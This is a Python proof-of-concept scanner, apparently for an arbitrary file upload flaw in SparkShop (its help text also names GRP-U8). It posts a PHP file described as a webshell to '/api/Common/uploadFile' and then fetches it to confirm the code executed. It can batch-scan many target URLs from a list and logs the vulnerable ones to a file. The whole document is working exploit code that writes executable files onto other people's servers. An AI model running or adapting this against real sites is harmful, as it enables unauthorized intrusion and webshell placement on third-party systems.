import sys
import requests
import argparse

# 漏洞检测模块
def checkVuln(url):
    vulnurl = url + "/api/Common/uploadFile"  #漏洞页面信息
    data = """------WebKitFormBoundaryj7OlOPiiukkdktZR
Content-Disposition: form-data; name="file";filename="2.php"

<?php echo"dd";?>
------WebKitFormBoundaryj7OlOPiiukkdktZR--"""  # Webshell

    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0',
               'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR'
               }
    try:
        response = requests.post(vulnurl, headers=headers, data=data, timeout=5, verify=False)
        if response.status_code == 200 and 'success' in response.text:
            dict=response.json()
            okurl=(dict['data']['url'])
            if "dd" in requests.get(okurl, headers=headers, timeout=5, verify=False).text:
                print(f"【+】当前网址存在漏洞：{url}")
                with open("loudong.txt", "a+") as f:
                    f.write(okurl + "\n")
            else:
                print("【-】目标网站不存在漏洞...")

        else:
            print("【-】目标网站不存在漏洞...")
    except Exception as e:
        print("【-】目标网址存在网络链接问题...")

# 批量漏洞检测模块
def batchCheck(filename):
    with open(filename, "r") as f:
        for readline in f.readlines():
            checkVuln(readline)

def banner():
    bannerinfo = """
  _________                   __      _________.__                   
 /   _____/__________ _______|  | __ /   _____/|  |__   ____ ______  
 \_____  \\____ \__  \\_  __ \  |/ / \_____  \ |  |  \ /  _ \\____ \ 
 /        \  |_> > __ \|  | \/    <  /        \|   Y  (  <_> )  |_> >
/_______  /   __(____  /__|  |__|_ \/_______  /|___|  /\____/|   __/ 
        \/|__|       \/           \/        \/      \/       |__| 

   """
    print(bannerinfo)
    print("SparkShop".center(100, '*'))
    print(f"[+]{sys.argv[0]} --url htttp://www.xxx.com 即可进行单个漏洞检测")
    print(f"[+]{sys.argv[0]} --file *.txt 即可对选中文档中的网址进行批量检测")
    print(f"[+]{sys.argv[0]} --help 查看更多详细帮助信息")
    print("--author:satyr ".rjust(100," "))

# 主程序方法，进行调用
def main():
    parser = argparse.ArgumentParser(description='GRP-U8-UploadFile漏洞单批检测脚本@satyr')
    parser.add_argument('-u','--url', type=str, help='单个漏洞网址')
    parser.add_argument('-f','--file', type=str, help='批量检测文本')
    args = parser.parse_args()
    if args.url:
        checkVuln(args.url)
    elif args.file:
        batchCheck(args.file)
    else:
        banner()   # 欢迎信息....

if __name__ == '__main__':
    main()


